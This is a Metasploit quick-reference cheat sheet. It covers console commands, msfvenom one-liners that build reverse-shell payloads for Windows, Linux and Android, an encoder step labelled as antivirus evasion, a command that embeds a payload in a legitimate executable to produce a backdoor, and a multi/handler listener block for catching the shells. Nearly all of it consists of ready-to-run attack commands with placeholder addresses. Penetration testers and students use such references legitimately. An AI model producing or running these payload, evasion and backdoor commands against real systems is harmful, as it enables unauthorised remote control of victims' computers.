# Metasploit Quick Reference Card

One-page cheat sheet. For details, see [the full manual](README.md).

---

## 🔥 Most Common Commands

| Task | Command |
|------|---------|
| Start Metasploit | `msfconsole` |
| Start with database | `msfconsole -d` |
| Search for a module | `search [keyword]` |
| Use a module | `use [module/path]` |
| Show options | `show options` |
| Set a parameter | `set [PARAM] [value]` |
| Set global parameter | `setg [PARAM] [value]` |
| Run the module | `run` or `exploit` |
| Background a session | `background` |
| List sessions | `sessions` |
| Interact with session | `sessions -i [ID]` |
| Kill a session | `sessions -k [ID]` |
| List jobs | `jobs` |
| Kill a job | `jobs -k [ID]` |
| Show all modules | `show [exploits/payloads/auxiliary/post]` |
| Get module info | `info` |
| Check if target is vulnerable | `check` |
| Exit Metasploit | `exit` |

---

## 📦 Payloads (msfvenom)

| Task | Command |
|------|---------|
| List payloads | `msfvenom -l payloads` |
| Windows reverse shell (EXE) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o shell.exe` |
| Windows reverse shell (PowerShell) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f psh-reflection -o payload.ps1` |
| Linux reverse shell | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o shell.elf` |
| Android reverse shell | `msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -o shell.apk` |
| Encoded payload (basic evasion) | `msfvenom -p [payload] -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe` |
| Embed in legitimate EXE | `msfvenom -p [payload] -x [legit.exe] -f exe -o backdoor.exe` |

---

## 🎯 Multi/Handler (Listener)

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [YOUR_IP]
set LPORT [YOUR_PORT]
set ExitOnSession false
run -j
```
